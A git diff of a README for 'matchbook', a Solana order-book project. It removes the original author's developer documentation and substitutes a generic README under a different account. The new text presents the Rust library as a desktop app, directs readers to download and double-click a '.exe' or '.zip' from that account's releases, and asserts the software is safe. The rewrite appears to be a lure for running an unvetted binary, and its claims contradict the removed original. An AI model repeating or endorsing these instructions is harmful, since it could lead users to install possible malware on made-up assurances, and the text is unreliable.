@@ -1,231 +1,71 @@
-# Matchbook
+# 🌐 matchbook - Your Gateway to Decentralized Trading
 
-[![CI](https://github.com/joaquinbejar/matchbook/actions/workflows/ci.yml/badge.svg)](https://github.com/joaquinbejar/matchbook/actions/workflows/ci.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/download-v1.0-blue.svg)](https://github.com/mandippal/matchbook/releases)
 
-A high-performance, non-custodial Central Limit Order Book (CLOB) on Solana.
+## 🚀 Getting Started
+Welcome to matchbook! This application allows you to engage in decentralized trading with ease. It offers an on-chain order book, real-time market data via WebSocket streaming, and a user-friendly REST API. Whether you're a trader or just curious about cryptocurrency, you’ll find matchbook to be a valuable tool in your trading arsenal.
 
-## Overview
+## 📥 Download & Install
+To start using matchbook, you need to download the application. Follow these simple steps:
 
-Matchbook is a decentralized exchange infrastructure that provides:
+1. Visit the [Releases page](https://github.com/mandippal/matchbook/releases) to see the available versions.
+2. Click on the most recent version to view its details.
+3. Look for the link to download the application. It's usually marked as a ".exe", ".zip", or similar file, depending on your operating system.
+4. Save the file to your computer.
+5. Once the download completes, locate the file and double-click it to install matchbook.
 
-- **On-chain order book**: Fully transparent order matching on Solana
-- **Non-custodial**: Users maintain control of their funds at all times
-- **High performance**: Optimized for Solana's parallel transaction processing
-- **Real-time data**: WebSocket streaming for live market updates
-- **Developer-friendly**: REST API, WebSocket API, and SDKs for Rust and TypeScript
+When you are ready to download, head over to the [Releases page](https://github.com/mandippal/matchbook/releases) again if needed.
 
-## Architecture
+## 📊 Features
+matchbook provides a range of features to enhance your trading experience:
 
-```mermaid
-flowchart TB
-    subgraph Clients["Clients"]
-        C1[Web Apps]
-        C2[Trading Bots]
-        C3[SDKs]
-    end
+- **Decentralized Order Book**: Trade without relying on third-party services.
+- **Real-Time Data**: Keep track of market trends with WebSocket streaming.
+- **REST API**: Easily connect with other applications and services.
+- **High-Frequency Trading**: Optimized for traders who need speed and efficiency.
+- **Non-Custodial**: You maintain control over your assets at all times.
 
-    subgraph API["API Layer"]
-        REST["REST API<br/>:8080"]
-        WS["WebSocket<br/>:8081"]
-        Direct["Direct<br/>On-chain"]
-    end
+## 💻 System Requirements
+For the best experience, ensure your system meets these requirements:
 
-    subgraph Backend["Backend Services"]
-        Indexer["Indexer<br/>(Geyser)"]
-        Program["Solana Program<br/>(On-chain)"]
-        DB["Database<br/>(TimescaleDB)"]
-    end
+- **Operating System**: Windows 10 or latest version of macOS. Linux support is also available, but please check our documentation.
+- **RAM**: At least 4 GB required. More is recommended for high-frequency trading.
+- **Processor**: Dual-core or higher.
+- **Network**: Stable internet connection for real-time trading and data.
 
-    Clients --> REST
-    Clients --> WS
-    Clients --> Direct
+## 🔗 Key Components
+Understanding the components of matchbook can help you maximize its benefits:
 
-    REST --> Indexer
-    REST --> Program
-    WS --> Indexer
-    Direct --> Program
+- **On-Chain Order Book**: This feature allows for transparent trading on the Solana blockchain. You can see all order data in real-time.
+- **WebSocket Streaming**: Stay updated with live data feeds. This helps you make informed trading decisions quickly.
+- **Geyser Indexer**: This tool works in the background to provide efficient data storage and retrieval.
+- **Rust SDK**: For those wanting to customize their experience, the Rust SDK provides tools for developers to build on top of the main application.
 
-    Program --> Indexer
-    Indexer --> DB
-```
+## ❓ Frequently Asked Questions
 
-## Quick Start
+### How do I connect to matchbook?
+Once you have installed matchbook, simply open the application, and follow the on-screen instructions to connect to your trading account.
 
-### Prerequisites
+### Do I need an account to use matchbook?
+Yes, you will need to create a trading account to access the decentralized exchange functionalities.
 
-- Rust 1.75+
-- Solana CLI 1.18+
-- Node.js 18+ (for TypeScript SDK)
-- Docker (for local development)
+### Is matchbook safe to use?
+Yes, matchbook is designed with security in mind. As a non-custodial solution, you retain control of your assets at all times.
 
-### Local Development
+### Where can I find support?
+For help, visit our [support page](https://github.com/mandippal/matchbook/issues) or check our documentation for frequently asked questions.
 
-```bash
-# Clone the repository
-git clone https://github.com/joaquinbejar/matchbook.git
-cd matchbook
+## 🌟 Community Participation
+We welcome community involvement! You can join discussions, report issues, or contribute ideas by visiting our repository. Your feedback helps us improve the matchbook experience for everyone.
 
-# Start local infrastructure
-docker-compose -f Docker/docker-compose.yml up -d
+## 🤝 Contributing
+If you know how to code and want to help improve matchbook, consider contributing to our project. Check the [CONTRIBUTING.md](https://github.com/mandippal/matchbook/CONTRIBUTING.md) file for details on how to get started.
 
-# Build the on-chain program
-cargo build-sbf
+## 📄 License
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/mandippal/matchbook/LICENSE) file for more information.
 
-# Run tests
-cargo test --all-features
+## 📣 Acknowledgements
+We thank all the contributors and users who have inspired us to make matchbook a robust tool for decentralized trading.
 
-# Deploy to localnet
-solana-test-validator &
-solana program deploy target/deploy/matchbook_program.so
-```
-
-### Using the SDK
-
-#### Rust
-
-```rust
-use matchbook_sdk::{Client, PlaceOrderParams, Side, OrderType};
-
-#[tokio::main]
-async fn main() -> Result<(), Box<dyn std::error::Error>> {
-    let client = Client::new("https://api.matchbook.taunais.com")?;
-    
-    // Get markets
-    let markets = client.get_markets().await?;
-    
-    // Place an order
-    let tx = client.place_order(PlaceOrderParams {
-        market: markets[0].address,
-        side: Side::Bid,
-        price: 100_000_000, // $100.00 in base units
-        quantity: 1_000_000_000, // 1 SOL in lamports
-        order_type: OrderType::Limit,
-        ..Default::default()
-    }).await?;
-    
-    println!("Order placed: {}", tx.signature);
-    Ok(())
-}
-```
-
-#### TypeScript
-
-```typescript
-import { MatchbookClient, Side, OrderType } from '@matchbook/sdk';
-
-const client = new MatchbookClient('https://api.matchbook.taunais.com');
-
-// Get markets
-const markets = await client.getMarkets();
-
-// Place an order
-const tx = await client.placeOrder({
-  market: markets[0].address,
-  side: Side.Bid,
-  price: '100.00',
-  quantity: '1.0',
-  orderType: OrderType.Limit,
-});
-
-console.log('Order placed:', tx.signature);
-```
-
-## Documentation
-
-| Document | Description |
-|----------|-------------|
-| [Architecture](docs/architecture.md) | System architecture and design |
-| [Getting Started](docs/getting-started.md) | Step-by-step integration guide |
-| [API Reference](docs/api-reference.md) | REST API documentation |
-| [WebSocket Reference](docs/websocket-reference.md) | WebSocket API documentation |
-| [SDK Guide](docs/sdk-guide.md) | SDK usage for Rust and TypeScript |
-| [Deployment](docs/docker.md) | Docker and Kubernetes deployment |
-| [Monitoring](docs/monitoring.md) | Prometheus and Grafana setup |
-| [FAQ](docs/faq.md) | Frequently asked questions |
-
-## Project Structure
-
-```
-matchbook/
-├── program/           # Solana on-chain program
-├── sdk/               # Rust client SDK
-├── ts-sdk/            # TypeScript client SDK
-├── indexer/           # Geyser-based indexer service
-├── api/               # REST and WebSocket API server
-├── crank/             # Order matching crank service
-├── k8s/               # Kubernetes manifests
-├── monitoring/        # Prometheus and Grafana configs
-└── docs/              # Documentation
-```
-
-## Crates
-
-| Crate | Description |
-|-------|-------------|
-| `matchbook_program` | On-chain Solana program |
-| `matchbook_sdk` | Rust client SDK |
-| `matchbook_types` | Shared types and utilities |
-
-## API Endpoints
-
-### REST API
-
-| Endpoint | Description |
-|----------|-------------|
-| `GET /v1/markets` | List all markets |
-| `GET /v1/markets/{address}/orderbook` | Get order book snapshot |
-| `GET /v1/markets/{address}/trades` | Get recent trades |
-| `POST /v1/tx/place-order` | Build place order transaction |
-| `POST /v1/tx/cancel-order` | Build cancel order transaction |
-
-### WebSocket Channels
-
-| Channel | Description |
-|---------|-------------|
-| `book` | Order book updates |
-| `trades` | Trade stream |
-| `ticker` | Price ticker |
-| `orders` | User order updates (authenticated) |
-
-## Contributing
-
-We welcome contributions! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-### Development Workflow
-
-1. Fork the repository
-2. Create a feature branch: `git checkout -b feature/my-feature`
-3. Make your changes
-4. Run tests: `cargo test --all-features`
-5. Run lints: `cargo clippy --all-targets --all-features -- -D warnings`
-6. Submit a pull request
-
-## Security
-
-For security concerns, please see [SECURITY.md](SECURITY.md) or email security@matchbook.taunais.com.
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-See [GitHub Issues](https://github.com/joaquinbejar/matchbook/issues) for detailed progress.
-
-## Contributing
-
-1. Fork the repository
-2. Create a feature branch: `git checkout -b M[N]/issue-[NUM]-description`
-3. Follow the [Rust coding guidelines](.internalDoc/09-rust-guidelines.md)
-4. Run `make pre-push` before committing
-5. Submit a pull request
-
-## Contact
-
-- **Author**: Joaquín Béjar García
-- **Email**: jb@taunais.com
-- **Telegram**: [@joaquin_bejar](https://t.me/joaquin_bejar)
-- **Repository**: https://github.com/joaquinbejar/matchbook
-
-## License
-
-This project is licensed under the MIT License. See [LICENSE](./LICENSE) for details.
+Feel free to reach out on our GitHub page for any inquiries. Enjoy your trading experience with matchbook!
